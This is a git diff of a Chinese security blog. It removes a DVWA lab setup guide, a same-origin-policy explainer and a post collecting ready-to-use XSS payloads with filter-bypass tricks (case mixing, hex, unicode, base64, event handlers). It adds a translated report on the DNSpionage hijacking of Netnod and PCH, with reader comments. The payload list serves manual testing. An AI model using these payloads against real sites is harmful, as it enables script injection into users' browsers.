-找到php的配置文件，修改allow_url_include=Off 为allow_url_include=on（参考<a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include%EF%BC%89">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include）</a><br/><br/>
-<figure><img src="media/15446897185202/15.png" alt="15"/></figure></p>
+<p>资料来源：远见安全</p>
 
-<p>然后修改/opt/lamp/etc/php.ini<br/><br/>
-<figure><img src="media/15446897185202/16.png" alt="16"/></figure></p>
+<p>根据Farsight的说法，请注意在IDM的域名中列出的其他内容为139.59.134 [。] 216：</p>
 
-<p>2、解决reCAPTCHA key，配置文件里面有个谷歌连接，点进去剩下的估计你也看得懂应该知道该怎么做额。<br/><br/>
-<figure><img src="media/15446897185202/17.png" alt="17"/></figure></p>
+<p><figure><img src="media/15505564665657/15505569541143.jpg" alt=""/></figure></p>
 
-<p><figure><img src="media/15446897185202/18.png" alt="18"/></figure></p>
+<p>域名<strong>sa1.dnsnode.net和fork.sth.dnsnode.net</strong>的DNS记录也从他们在瑞典的合法家园改为12月份由攻击者控制的德国托管服务提供商。这些域名由<a href="https://www.netnod.se/">Netnod Internet Exchange</a>拥有，  <a href="https://www.netnod.se/">Netnod Internet Exchange</a>是一家位于瑞典的主要全球DNS提供商。Netnod还运营着<a href="https://en.wikipedia.org/wiki/Root_name_server">13个“根”名称服务器之一</a>，  这是构成全球DNS系统基础的关键资源。</p>
 
-<p>3、解决最后的两个NO<br/><br/>
-<figure><img src="media/15446897185202/19.png" alt="19"/></figure></p>
+<p>我们马上回到Netnod。但首先让我们看看CrowdStrike报告中引用的另一个Internet地址，作为DNSpionage黑客滥用的基础设施的一部分：<strong>82.196.11[.]127</strong>。荷兰的这个地址也是域名<strong>mmfasi[.]com</strong>的所在地，Crowdstrike说这是一个攻击者的域名之一，被用作一些被劫持的基础设施的DNS服务器。</p>
 
-<p>我们给这两个文件加权，运行命令：<br/><br/>
-<figure><img src="media/15446897185202/20.png" alt="20"/></figure></p>
+<p><figure><img src="media/15505564665657/15505570490488.jpg" alt=""/></figure></p>
 
-<p>然后点击<br/><br/>
-<figure><img src="media/15446897185202/21.png" alt="21"/></figure></p>
+<p>正如我们在上面的屏幕截图中看到的那样，82.196.11[.]127暂时是另一对Netnod DNS服务器以及服务器“ ns.anycast.woodynet.net ”的所在地。该域名来源于昵称  <a href="https://en.wikipedia.org/wiki/Bill_Woodcock">Bill Woodcock</a>，担任<a href="https://www.pch.net/">Packet Clearing House（PCH）</a>的执行董事  。</p>
 
-<p>纳尼!?<br/><br/>
-<figure><img src="media/15446897185202/22.png" alt="22"/></figure></p>
+<p>PCH是一家位于加利福尼亚州北部的非营利性实体，它还管理着世界上大量的DNS基础设施，特别是超过500个顶级域名的DNS和DNSpionage所针对的一些中东顶级域名。</p>
 
-<p>只好回头再看看XAMPP的数据库配置文件，你会发现他的password默认是被注释了，我们取消注释。<br/><br/>
-<figure><img src="media/15446897185202/23.png" alt="23"/></figure></p>
+<p>以目标公司为目标<br/>
+Netnod首席执行官 LarsMichaelJogbäck于2月14日与KrebsOnSecurity联系，确认Netnod的DNS基础设施部分在2018年12月底和2019年1月初被攻击者获取Netnod域名注册商账户后被劫持。</p>
 
-<p>最后你会发现不管怎么搞还是报错……这就尴尬了……<br/>
-经过尝试，我发现以下配置可以进入登录界面。<br/>
-XAMPP配置如下：<br/><br/>
-<figure><img src="media/15446897185202/24.png" alt="24"/></figure></p>
+<p>Jogbäck指出该公司于2月5日在其网站上发布的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">声明</a>，该声明称Netnod在1月2日了解了它在攻击中的作用，并在整个过程中与所有相关方和客户保持联系。</p>
 
-<p>密码还是按照默认的注释掉<br/><br/>
-<figure><img src="media/15446897185202/25.png" alt="25"/></figure></p>
+<p>“作为国际安全合作的参与者，Netnod在2019年1月2日意识到我们已经陷入了这波浪潮中，我们经历了MITM（中间人）攻击，”声明中写道。“Netnod不是袭击的最终目标。该目标被认为是在瑞典以外的国家捕获互联网服务的登录详细信息。“</p>
 
-<p>DVWA配置如下：<br/><br/>
-<figure><img src="media/15446897185202/26.png" alt="26"/></figure></p>
+<p>在2月15日与该作者的访谈中，PCH的伍德科克承认，在DNSpionage黑客滥用未经授权的域名注册商访问后，其组织的部分基础设施遭到了破坏。</p>
 
-<p>接着你就能进入登录界面了。恭喜！<br/>
-http://localhost/DVWA-master/login.php<br/><br/>
-<figure><img src="media/15446897185202/27.png" alt="27"/></figure></p>
+<p>碰巧，pch.net和dnsnode.net的注册商记录指向相同的来源：<strong>Key-Systems GmbH</strong>，一家位于德国的域名注册商; 和<strong>Frobbit.se</strong>，瑞典的一家公司。Frobbit是Key Systems的经销商，两家公司共享一些相同的在线资源。</p>
 
-<p>输入账号密码然后登录就能愉快的玩耍了。<br/><br/>
-<figure><img src="media/15446897185202/28.png" alt="28"/></figure></p>
+<p>伍德科克表示，黑客已经破获了PCH的注册商用于发送称为<a href="https://en.wikipedia.org/wiki/Extensible_Provisioning_Protocol">可扩展供应协议（EPP</a>的信令消息的凭据  。EPP是一个鲜为人知的界面，可作为全球DNS系统的一种后端，允许域名注册商通知区域注册机构（如Verisign）有关域记录的更改，包括新域名注册，修改和转移。</p>
 
-<p>什么？你进不去？账号密码是什么？预知后事如何，请听下回分解。    </p>
+<p>“1月初，Key-Systems表示，他们相信他们的EPP界面已被滥用有效证件的人滥用，”伍德科克说。</p>
 
-<p>下集预告：<br/><br/>
-　　欢迎来到DVWA的世界，这是你的第一关，登录破解…… </p>
+<p>Key-Systems拒绝评论这个故事，除了说它没有讨论其经销商客户业务的细节。</p>
 
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 16:28 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
+<p>Netnod 关于此次袭击的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">书面声明</a>提到了该公司安全总监PatrikFältström的进一步询问，PatrikFältström也是Frobbit.se的共同所有人。</p>
 
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15446893463166.html">
-                
-                  <h1>xss常用payload</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
-</blockquote>
+<p>Fältström在给KrebsOnSecurity的电子邮件中表示，Frobbit和Key Systems的DNSpionage攻击者将未经授权的EPP指令发送到各个注册机构。</p>
 
-<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
+<p>“从我的角度来看，这次攻击显然是严重的EPP攻击的早期版本，”他写道。“也就是说，目标是将正确的EPP命令发送到注册管理机构。对于未来的推断，我个人非常紧张。注册管理机构是否允许任何EPP命令来自注册商？我们总会有一些弱的注册商，对吧？“</p>
 
-<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
+<h2 id="toc_1">DNSSEC</h2>
 
-<p>1.大小写混合绕过<br/>
-顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
+<p>这些攻击的一个更有趣的方面是，Netnod和PCH都是DNSSEC（又称“DNS安全扩展”）的声音支持者和采用者，这是一种旨在打败DNSpionage黑客能够攻击的那种攻击的技术。执行。</p>
 
-<p>2.闭合标签绕过</p>
+<p><figure><img src="media/15505564665657/15505571774864.jpg" alt=""/></figure><br/>
+图片：APNIC</p>
 
-<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
+<p>DNSSEC通过要求对给定域或域集的所有DNS查询进行数字签名来保护应用程序不使用伪造或操纵的DNS数据。在DNSSEC中，如果名称服务器确定给定域的地址记录在传输过程中未被修改，则它会解析域并让用户访问该站点。但是，如果该记录已以某种方式被修改或与所请求的域不匹配，则名称服务器会阻止用户访问欺诈性地址。</p>
 
-<p>3.HEX编码来绕过</p>
+<p>根据APNIC（亚太地区互联网地址注册机构）收集的<a href="https://stats.labs.apnic.net/dnssec/XA?c=XA&amp;x=1&amp;g=1&amp;r=1&amp;w=7&amp;g=0">测量数据</a>，虽然DNSSEC可以成为减轻DNSpionage发起的攻击的有效工具，但只有约20％的全球主要网络和网站启用了它。区域。</p>
 
-<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
+<p>Jogbäck表示，Netnod的基础设施遭受了来自DNSpionage攻击者的三次单独攻击。前两个发生在2018年12月14日到2019年1月2日之间的两周时间窗口中，以及未受 DNSSEC保护的目标公司服务器。</p>
 
-<p>4.Javascript URL</p>
+<p>不过，他说，12月29日和1月2日的第三次攻击针对性的Netnod基础设施是由DNSSEC和服务自己的内部电子邮件网络保护。然而，由于攻击者已经可以访问其注册商的系统，因此他们能够暂时禁用该安全措施 - 或者至少足以获得<a href="two%20of%20Netnod%E2%80%99s">Netnod的两个</a> <a href="https://crt.sh/?id=1071723007">电子邮件服务器的</a> SSL证书。</p>
 
-<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
+<p>Jogbäck告诉KrebsOnSecurity，一旦攻击者拥有这些证书，他们就会为公司的目标服务器重新启用DNSSEC，同时显然准备启动攻击的第二阶段 - 将流经其邮件服务器的流量转移到攻击者控制的机器上。但Jogbäck表示，无论出于何种原因，攻击者在以后尝试吸收互联网流量之前，都忽略了使用未经授权的访问其注册商来禁用DNSSEC。</p>
 
-<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
+<p>“对我们来说幸运的是，当他们发起他们的中间人攻击时，他们忘了删除它，”他说。“如果他们更熟练，他们就会删除域名上的DNSSEC，这是他们本可以做到的。”</p>
 
-<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
+<p>伍德科克表示，PCH在其所有基础设施上验证了DNSSEC，但并非所有公司的客户 - 特别是DNSpionage所针对的中东国家 - 都已将其系统配置为全面实施该技术。</p>
 
-<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
+<p>Woodcock表示，PCP的基础设施是针对DNSpionage攻击者在2018年12月13日和2019年1月2日之间的四次不同攻击中的目标。每次攻击，黑客都会打开他们的密码啜饮工具大约一个小时，然后在返回之前将其关闭每次运行后网络恢复到原始状态。</p>
 
-<p>===&gt;常用代码如下：</p>
+<p>攻击者不需要每次启动他们的监控拖网超过一个小时，因为大多数现代智能手机被配置为持续为用户可能在他的设备上设置的任何帐户提取新电子邮件。因此，攻击者能够通过每次短暂的劫持来获取大量的电子邮件凭据。</p>
 
-<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
+<p>在2019年1月2日 - 也就是DNSpionage黑客追踪Netnod内部电子邮件系统的同一天 - 他们还直接针对PCH，从Comodo获得了两个处理该公司内部电子邮件的PCH域的<a href="https://crt.sh/?id=1075482182">SSL </a><a href="https://crt.sh/?id=1075482666">证书</a>。</p>
 
-<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<p>伍德科克表示，PCH对DNSSEC的依赖几乎完全阻止了这种攻击，但它设法为当时旅行的两名员工收集电子邮件凭据。这些员工的移动设备通过酒店无线网络下载公司电子邮件 - 作为使用无线服务的先决条件 - 迫使他们的设备使用酒店的DNS服务器，而不是PCH的DNNSEC系统。</p>
 
-<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
+<p>伍奇科克说：“这两个人确实被弹出，他们都在旅行并且使用他们的iPhone，他们不得不在劫持期间穿越俘虏门户网站。” “他们不得不关闭我们的名称服务器以使用强制网络门户，在此期间，手机上的邮件客户端检查了新的电子邮件。除此之外，DNSSEC还使我们免于真正彻底拥有。“</p>
 
-<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
+<p>由于PCH使用DNSSEC保护其域名，劫持其邮件基础设施的实际效果是，大约一个小时没有人，但两名远程员工收到任何电子邮件。</p>
 
-<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
+<p>“对于我们基本上所有的用户来说，它看起来就像邮件服务器短时间内无法使用，”伍德科克说。“如果他们碰巧正在检查他们的手机或其他什么，它暂时没有解决，而且每个人都认为这很有趣，我会在一段时间后再检查一下。当他们再次检查时它工作正常。我们的一些工作人员注意到我们的电子邮件服务发生了短暂的中断，但没有人认为可以与其他任何人讨论或打开机票。“</p>
 
-<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+<p>但DNSpionage黑客并没有被吓倒。PCH在本月早些时候发给客户的一封信中表示，法医调查确定，1月24日，一台拥有其网站用户数据库的计算机遭到入侵。存储在数据库中的用户数据包括客户的用户名，<a href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a>密码哈希值，电子邮件，地址和公司名称。</p>
 
-<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+<p>“我们没有看到任何证据表明攻击者访问了用户数据库或泄露了它，”该消息显示。“因此，我们在透明度和预防措施方面为您提供这些信息，而不是因为我们认为您的数据受到了损害。”</p>
 
-<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
+<h2 id="toc_2">改进</h2>
 
-<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
+<p>针对这个故事接受采访的多位专家表示，基于DNS的攻击存在的一个长期问题是，许多组织倾向于将其大部分DNS基础架构视为理所当然。例如，许多实体甚至不记录其DNS流量，也不密切关注对其域记录所做的任何更改。</p>
 
-<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
+<p>即使对于那些努力监控其DNS基础架构以进行可疑更改的公司，一些监控服务也只是被动地拍摄DNS记录的快照，或者只是每天一次地主动执行。事实上，伍德科克表示，PCH依赖于不少于三个监控系统，并且他们都没有提醒他的组织注意到PCH的DNS系统遭遇的各种一小时劫持事件。</p>
 
-<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
+<p>“我们有三种不同的商业DNS监控服务，其中没有一项能够实现，”他说。“他们甚至都没有警告我们事情发生后就已经发生了。”</p>
 
-<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
+<p>伍德科克表示，PCH已经建立了一个系统，每小时多次轮询自己的DNS基础设施，并在任何变化时立即发出警报。</p>
 
-<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
+<p>Jogbäck表示，Netnod还加强了监控，并加倍努力确保使用所有可用于保护其域基础架构的选项。例如，该公司之前没有使用“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域锁定</a> ” 保护其所有域名，“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域名锁定</a> ”是一种服务，要求注册商在对域记录进行任何修改之前采取其他身份验证步骤。</p>
 
-<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
+<p>“我们真的很伤心，我们没有更好地保护我们的客户，但我们也是攻击链中的受害者，”Jogbäck说。“你被抢劫后可以换成更好的锁，并希望让某人再次做到更难。但我可以真实地说，我们已经从这次袭击中成为受害者中学到了很多，而且我们现在比以前好多了。“</p>
 
-<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
+<p>伍德科克表示，他担心互联网决策者和其他基础设施提供商不会严重或迫切地对全球DNS构成威胁，他相信DNSpionage黑客将在未来数月和数年内有大量其他受害者攻击和利用。</p>
 
-<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
+<p>“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。</p>
 
-<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
+<p>“所有这一切都是一场战斗，”他说。“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。他们希望获得尽可能多的方式，以便将来可以用于特定的目标。“</p>
 
-<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
+<h2 id="toc_3">建议</h2>
 
-<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
+<p>John Crain是<a href="https://en.wikipedia.org/wiki/ICANN">ICANN</a>的首席安全，稳定和弹性官员，ICANN是负责监管全球域名行业的非营利实体。Crain表示，许多可以使攻击者更难以劫持目标域或DNS基础架构的最佳实践已经有十多年了。</p>
 
-<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
+<p>“这很大程度上取决于数据卫生，”Crain说。“大型组织直到妈妈和流行实体都没有关注一些非常基本的安全实践，比如多因素身份验证。如今，如果你有一个次优的安全立场，你就会被拥有。这就是今天的现实。我们现在看到更复杂的对手现在在互联网上采取行动，如果你没有做基本的事情，他们会打击你。“</p>
 
-<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
-
-<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
-
-<p><code>&lt;body/onload=alert(12)&gt;</code></p>
-
-<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
-
-<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
-
-<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
-
-<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
-
-<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
-
-<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
-
-<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
-
-<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 16:22 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15446892905759.html">
-                
-                  <h1>同源策略</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>摘自网络，出处忘了。</p>
-</blockquote>
-
-<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
-举例：<br/>
-假设源是：<code>http://store.company.com/dir/page.html</code><br/>
-同源的是：<br/>
-<code>http://store.company.com/dir2/other.html</code><br/>
-<code>http://store.company.com/dir/inner/another.html</code><br/>
-不同源的是：<br/>
-<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
-<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
-<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>
-
-<h2 id="toc_0">同源策略控制内容</h2>
-
-<p><em>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</em><br/>
-一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>
-
-<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>
+<p>组织的一些最佳实践包括：</p>
 
 <ul>
-<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
-<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
-<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
+<li><p>使用DNSSEC（签名区域和验证响应）</p></li>
+<li><p>使用注册表锁等注册功能，可以帮助保护域名记录不被更改</p></li>
+<li><p>使用应用程序，Internet流量和监控的访问控制列表</p></li>
+<li><p>使用双因素身份验证，并要求所有相关用户和分包商使用它</p></li>
+<li><p>如果使用密码，请选择唯一密码并考虑密码管理器</p></li>
+<li><p>审核注册商和其他提供商的帐户</p></li>
+<li><p>通过监控来监控证书，例如，<a href="%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E6%97%A5%E5%BF%97">证书透明度日志</a></p></li>
 </ul>
 
-<p>下面是可能嵌入跨域资源的示例：<br/>
-<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
-<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
-<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
-<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>
+<p>标签：APNIC，比尔·伍德科克，思科塔洛斯，科摩多，CrowdStrike，国土安全部，DNSpionage，DNSSEC，EPP，可扩展的供应协议，远见安全，FireEye的，Frobbit，ICANN，约翰·克雷恩，键控系统，拉尔斯·迈克尔Jogbäck，LetsEncrypt，Netnod，包清算所，PatrikFältström，PCH，SecurityTrails，美国国土安全部</p>
+
+<p>此条目发布于2019年2月18日星期一上午8:51，并在A Little Sunshine，Data Breaches，The Coming Storm下提交。您可以通过RSS 2.0 Feed 关注此条目的任何评论。您可以跳到最后并发表评论。目前不允许Pinging。</p>
+
+<hr/>
+
+<h2 id="toc_4">26条评论（懒得处理格式了）</h2>
+
+<p>Beau Kinstler<br/>
+2019年2月18日上午9:50<br/>
+一如既往的棒极了。谢谢Brian。出于好奇，你如何将DNSSEC和你在这里发布的攻击与GRC.com和Steve Gibson的“DNS欺骗”测试工具中描述的DNS缓存中毒联系起来？<br/>
+<a href="https://www.grc.com/dns/dns.htm">https://www.grc.com/dns/dns.htm</a></p>
+
+<p>答复<br/>
+BrianKrebs<br/>
+2019年2月18日晚上10:21<br/>
+DNS缓存中毒最常发生在更本地级别，即用户的机器或路由器。本故事中描述的攻击涉及将DNS设置妥协到更高级别，远远超出最终用户的控制范围。</p>
+
+<p>答复<br/>
+汤姆威尔士<br/>
+2019年2月18日上午9:58<br/>
+“伊朗人不只是试图做出这些攻击立即生效”。</p>
+
+<p>我查看了这篇文章，但我找不到任何证据表明“伊朗人”是肇事者。</p>
+
+<p>有没有，或者这只是更具政治色彩的暗杀？</p>
+
+<p>答复<br/>
+BrianKrebs<br/>
+2019年2月18日上午10:31<br/>
+查看故事中链接的CrowdStrike博客文章。我没有打印很多我的信息，主要是因为故事已经很长了，无论如何这可能不是我将在这个主题上写的最后一个。但是，我也试图不提供太多细节，以帮助攻击者在未来改进攻击。也就是说，从我对这个故事中未提及的许多人的访谈中可以清楚地看出，有一些线索指向某些特定威胁行为者的相当大的努力。</p>
+
+<p>答复<br/>
+TreFunny<br/>
+2019年2月18日上午11点50分<br/>
+关注CrowdStrike，他们只是联邦调查局的私人部门......看看与FBI的所有联系，这是可怕的。</p>
+
+<p>看看他们是如何处理DNC黑客的，并没有停止它19天或疯狂的事情，但只花了2个小时来识别“熊”......吓人。</p>
+
+<p>CrowdStrike将会在这些日子里曝光......</p>
+
+<p>答复<br/>
+戴夫亚当斯<br/>
+2019年2月18日上午10:42<br/>
+优秀的研究Brian。我希望使用DNSSec的20％都在美国。作为网络安全分析师，任何异常都是有原因的。如果您的邮件交换中断一小时，请进行调查。我们都需要做的不仅仅是保护我们的系统。我们还需要验证数据的来源。</p>
+
+<p>答复<br/>
+阳光之州<br/>
+2019年2月18日上午11:41<br/>
+我知道我的域名，我使用2FA访问网站界面，以及DNSSEC和注册表锁定已启用</p>
+
+<p>答复<br/>
+Greg Askew<br/>
+2019年2月18日上午11:54<br/>
+“然而，他说，12月29日至1月2日的第三次攻击是针对受DNSSEC保护并服务于其内部电子邮件网络的Netnod基础设施。然而，由于攻击者已经可以访问其注册商的系统，他们能够暂时禁用该安全措施“。</p>
+
+<p>这没有意义。不应该通过关闭服务器区域上的DNSSEC来禁用DNSSEC。要使DNSSEC提供任何值，它需要配置DNS服务器和客户端计算机上的实施。在Windows上，使用名称解析策略表（NRPT）执行客户端强制执行。如果未在客户端上强制执行DNSSEC，则它实际上不提供任何值。如果在客户端上强制执行DNSSEC，则禁用DNS服务器上的区域的DNSSEC将导致客户端上的名称解析失败。如果任何受害组织拥有支持DNSSEC的域，但未在其客户端计算机上强制执行DNSSEC，则他们会自行开枪。</p>
+
+<p>答复<br/>
+JJ<br/>
+2019年2月18日下午2:53<br/>
+杀死DNSSEC只需要摆脱DS记录。我不得不走很多公司，为什么他们全新的DNSSEC配置并没有真正起作用，而且几乎总是因为他们没有相应的DS记录。人们不再做功课了：“但我们签了这个区！”</p>
+
+<p>答复<br/>
+丹尼斯塞甘<br/>
+2019年2月18日下午12:17<br/>
+“为什么CISA发布了我们的第一份紧急指令” <br/>
+，主任Christopher Krebs</p>
+
+<p>任何关系？</p>
+
+<p>答复<br/>
+BrianKrebs<br/>
+2019年2月18日下午12:18<br/>
+不</p>
+
+<p>答复<br/>
+表姐艾迪<br/>
+2019年2月18日下午12:28<br/>
+伊朗和俄罗斯似乎正在为网络战争做准备。<br/>
+希望我们的政府（Home Land Security，FBI，CIA）能够保护我们的国家。我真的希望并祈祷特朗普总统会让Brian Krebs成为我们政府网络恐怖部门的负责人！</p>
+
+<p>答复<br/>
+橡子<br/>
+2019年2月18日下午12:55<br/>
+185.20.187 [。] 8封锁，未知原因，由Forcepoint，Fortinet，卡巴斯基（等）<br/>
+提供，分析，卡巴斯基（等）2019-02-15 <br/>
+<a href="http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis">http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis</a></p>
+
+<p>2018-12-03 <br/>
